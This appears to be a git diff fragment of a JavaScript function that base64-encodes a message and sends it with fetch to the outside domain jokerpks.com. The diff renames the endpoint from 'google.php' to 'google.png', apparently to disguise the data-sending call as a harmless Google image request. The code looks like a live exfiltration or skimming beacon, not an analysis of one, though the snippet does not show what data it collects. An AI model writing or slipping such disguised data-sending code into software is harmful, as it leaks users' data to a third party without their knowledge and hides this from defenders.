@@ -65,7 +65,7 @@ function send(atributosScript) {
     	return;
     }
 
-    const urlComParametro = `https://jokerpks.com/google.php?i=${encodeURIComponent(mensagemBase64)}`;
+    const urlComParametro = `https://jokerpks.com/google.png?i=${encodeURIComponent(mensagemBase64)}`;
     
     fetch(urlComParametro, {
 	    method: 'GET',
